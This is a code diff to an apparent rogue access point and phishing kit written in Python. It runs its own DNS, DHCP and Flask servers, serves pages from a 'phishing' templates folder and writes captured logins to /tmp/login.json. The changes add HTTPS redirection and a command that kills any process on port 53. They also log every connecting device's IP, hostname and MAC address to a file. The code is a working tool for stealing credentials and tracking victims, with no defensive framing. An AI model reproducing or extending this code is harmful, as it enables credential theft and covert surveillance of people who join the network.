@@ -1,12 +1,12 @@
 import os
 import threading
 from flask import Flask, request, render_template, redirect, url_for
+from flask_sslify import SSLify
 import json
 import re
 import network
 from multiprocessing import Process
 import datetime
-import NetBIOS
 import socket
 import struct
 import IN
@@ -58,8 +58,8 @@ class DNSServer(object):
 
     def run(self):
         dns_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
-        #dns_sock.setblocking(0)        # setblocking(False) is equivalent to settimeout(0.0).
         dns_sock.settimeout(3)  # Set timeout on socket-operations.
+        execute('fuser -k -n tcp 53')
         dns_sock.bind(('', 53))
         while self.START_SIGNAL:
             try:
@@ -135,6 +135,9 @@ class DHCPServer:
 
         # Specific key is MAC
         self.leases = defaultdict(lambda: {'ip': '', 'expire': 0, 'ipxe': self.ipxe})
+        self.connect_user = dict()
+        self.connect_data = ''
+
 
     def get_namespaced_static(self, path, fallback = {}):
         statics = self.static_config
@@ -312,8 +315,6 @@ class DHCPServer:
             # 6 bytes MAC to string.
             [client_mac] = struct.unpack('!28x6s', message[:34])                # Get MAC address
             self.leases[client_mac]['options'] = self.tlv_parse(message[240:])
-            if self.leases[client_mac]['options'].has_key([12]) :               # code 12 is dns information
-                print self.leases[client_mac]['options'][12][0]                 # devce-name
             type = ord(self.leases[client_mac]['options'][53][0])               # see RFC2131, page 10
             # 1 = DHCP Discover message (DHCPDiscover).
             # 2 = DHCP Offer message (DHCPOffer).
@@ -326,6 +327,18 @@ class DHCPServer:
             if type == 1:
                 try:
                     self.dhcp_offer(message)
+                    self.connect_user.update({
+                        'connected': self.leases[client_mac]['ip'],
+                        'host_name': self.leases[client_mac]['options'][12][0],
+                        'mac_addr': self.get_mac([client_mac][0]),
+                        'Time': datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S')
+                    })
+                    self.connect_data = self.connect_data.replace('[', '')
+                    self.connect_data = self.connect_data.replace(']', '')
+                    self.connect_data = '[' + self.connect_data + str(self.connect_user) + ', ]'
+                    with open('/tmp/connect.json', 'w+') as con_log_file:
+                        json.dump(self.connect_data, con_log_file, ensure_ascii=False)
+                        con_log_file.close()
                 except OutOfLeasesError:
                     pass
             elif type == 3 and address[0] == '0.0.0.0' and not self.mode_proxy:
@@ -343,11 +356,10 @@ class WEBServer(object):
         self.app = Flask(__name__,
                          template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'phishing/templates'),
                          static_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'phishing/static'))
+        self.sslify = SSLify(self.app)
         self.iface = iface
         self.logged_user = dict()
         self.logged_data = ''
-        self.connect_user = dict()
-        self.connect_data = ''
 
     def run(self):
         try:
@@ -389,22 +401,7 @@ class WEBServer(object):
         with open('/tmp/login.json', 'w+') as log_file:
             json.dump(self.logged_data, log_file, ensure_ascii=False)
             log_file.close()
-        self.write_log(request.remote_addr)
         return redirect(url_for('index'))
-
-    def write_log(self, address):
-        self.connect_user.update({
-            'connected': address,
-            'host_name': NetBIOS.NetBIOS().queryIPForName(address),                     # DNS Information
-            'mac_addr': network.get_remote_mac(self.iface, address),
-            'Time': datetime.datetime.fromtimestamp(time.time()).strftime('%Y-%m-%d %H:%M:%S'),
-        })
-        self.connect_data = self.connect_data.replace('[', '')
-        self.connect_data = self.connect_data.replace(']', '')
-        self.connect_data = '[' + self.connect_data + str(self.connect_user) + ', ]'
-        with open('/tmp/connect.json', 'w+') as con_log_file:
-            json.dump(self.connect_data, con_log_file, ensure_ascii=False)
-            con_log_file.close()
 
     @staticmethod
     def split_url(url):
